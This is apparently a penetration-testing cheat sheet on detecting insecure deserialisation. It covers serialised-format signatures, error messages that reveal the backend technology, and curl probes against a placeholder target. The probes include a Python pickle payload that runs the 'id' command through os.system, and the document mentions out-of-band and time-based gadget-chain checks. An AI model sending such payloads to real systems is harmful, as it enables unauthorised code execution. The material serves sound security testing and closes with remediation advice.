# Deserialisation Detection

## Summary
Identify serialised data formats, detect deserialisation endpoints, and recognise error-based information leaks.

## Serialised Format Signatures

### PHP
```
a:2:{s:4:"name";s:4:"john";s:3:"age";i:25;}
O:7:"Example":1:{s:1:"x";s:5:"hello";}
```
- Starts with `a:` (array), `O:` (object), `s:` (string), `i:` (int)
- Often base64-encoded or stored in cookies: `TzoxOiJYIjoxOntzOjE6IngiO3M6NToiaGVsbG8iO30=`

### Java
```hex
AC ED 00 05  —  hex header (magic bytes)
\xac\xed\x00\x05  —  raw byte header
```
- Base64 variant: `rO0AB...` (base64 of AC ED 00 05)
- Seen in cookies (`JSESSIONID` like values), request bodies, hidden fields

### Python Pickle
```
\x80\x04\x95...   — protocol 4 header
\x80\x03}q...     — protocol 3 dict
```
- Protocol 0 is ASCII: `(lp0\n...`
- Often base64-encoded in APIs

### Ruby MARSHAL
```hex
04 08 5b 06...
```
- Starts with \x04\x08 (version 4.8)
- ASCII variant: `\x04\x08o:\x08User\x00`

## Error-Based Detection

Inject malformed serialised data and look for:

| Error | Likely Technology |
|-------|-------------------|
| `unserialize(): Error at offset` | PHP |
| `java.io.StreamCorruptedException` | Java |
| `pickle.UnpicklingError` | Python |
| `TypeError: incompatible marshal format` | Ruby |
| `ClassNotFoundException` | Java (class loading info) |

## Detection Payloads

### PHP — Invalid class
```bash
# Send malformed serialised object in cookie
curl -b "session=O:1:\"X\":0:{}" https://target.com/
# Expected: error or 500 if unserialize() is called
```

### Java — Corrupt stream
```bash
# Send short corrupted AC ED header
printf '\xac\xed\x00\x05' | base64 | xargs -I{} curl -b "token={}" https://target.com/
```

### Python — Bad pickle
```bash
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/python-pickle" \
  --data-binary "cos\nsystem\n(S'id'\ntR."
```

## Blind Detection

When no error is visible:
- Use out-of-band callbacks (DNS, HTTP collaborator) via gadget chains
- Time-based: inject `sleep()` in __reduce__ or gadget chain
- Check Content-Type: `application/x-php-serialized`, `application/java-serialization-object`

## Remediation
- Never deserialise untrusted data
- Use safe data formats (JSON) instead of native serialisation
- Implement integrity checks (HMAC) if deserialisation is unavoidable
